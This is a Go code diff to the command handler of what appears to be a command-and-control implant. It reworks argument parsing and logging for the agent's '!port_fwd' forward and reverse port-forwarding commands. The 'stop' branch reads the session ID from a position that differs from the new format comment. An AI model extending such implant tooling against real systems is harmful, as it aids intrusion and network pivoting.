@@ -110,11 +110,13 @@ func processCCData(data *MsgTunData) {
 		}
 
 		// port fwd
+		// cmd format: !port_fwd [to/listen] [shID] [operation]
 		if cmdSlice[0] == "!port_fwd" {
-			if len(cmdSlice) != 3 {
+			if len(cmdSlice) != 4 {
+				log.Printf("Invalid command: %v", cmdSlice)
 				return
 			}
-			switch cmdSlice[2] {
+			switch cmdSlice[3] {
 			case "stop":
 				sessionID := cmdSlice[1]
 				pf, exist := PortFwds[sessionID]
@@ -127,10 +129,10 @@ func processCCData(data *MsgTunData) {
 					sessionID := cmdSlice[2]
 					err = PortFwd(addr, sessionID, true)
 					if err != nil {
-						log.Printf("PortFwd failed: %v", err)
+						log.Printf("PortFwd (reverse) failed: %v", err)
 					}
 				}()
-			default:
+			case "on":
 				go func() {
 					to := cmdSlice[1]
 					sessionID := cmdSlice[2]
@@ -139,6 +141,7 @@ func processCCData(data *MsgTunData) {
 						log.Printf("PortFwd failed: %v", err)
 					}
 				}()
+			default:
 			}
 
 			return
